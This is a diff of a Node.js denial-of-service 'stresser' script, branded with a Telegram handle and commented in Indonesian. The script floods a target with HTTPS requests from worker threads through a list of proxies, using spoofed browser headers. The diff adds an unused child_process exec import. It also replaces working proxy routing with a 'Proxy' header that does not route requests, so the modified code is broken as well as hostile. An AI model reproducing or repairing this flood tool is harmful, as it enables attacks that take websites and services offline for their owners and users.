@@ -2,7 +2,7 @@ const https = require('https');
 const fs = require('fs');
 const { Worker, isMainThread, workerData } = require('worker_threads');
 const { URL } = require('url');
-const HttpsProxyAgent = require('https-proxy-agent'); // Perbaiki cara impor
+const { exec } = require('child_process');
 
 if (isMainThread) {
     if (process.argv.length < 7) {
@@ -35,7 +35,7 @@ if (isMainThread) {
             'Host': target.hostname,
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ' +
                           '(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-            'Connection': 'keep-alive', // Memastikan koneksi tetap hidup
+            'Connection': 'keep-alive',
             'Accept': '*/*',
             'Accept-Encoding': 'gzip, deflate, br',
             'Accept-Language': 'en-US,en;q=0.9',
@@ -47,11 +47,16 @@ if (isMainThread) {
         const interval = setInterval(() => {
             console.log(`SXUDIA STRESSER TELE @abibsaudia`);
 
-            // Kirim permintaan untuk setiap proxy secara bersamaan
+            // Kirim permintaan dengan semua proxy secara bersamaan
             PROXY_LIST.forEach(proxy => {
-                const agent = new HttpsProxyAgent(`http://${proxy}`); // Gunakan proxy untuk setiap permintaan
-
-                const reqOptions = { ...HTTP_OPTIONS, agent };
+                const [ip, port] = proxy.split(':');  // Memisahkan IP dan Port
+                const reqOptions = {
+                    ...HTTP_OPTIONS,
+                    headers: {
+                        ...HTTP_OPTIONS.headers,
+                        'Proxy': `http://${ip}:${port}` // Menggunakan IP dan Port dari file proxy.txt
+                    }
+                };
 
                 const req = https.request(reqOptions, res => {
                     res.on('data', () => {});
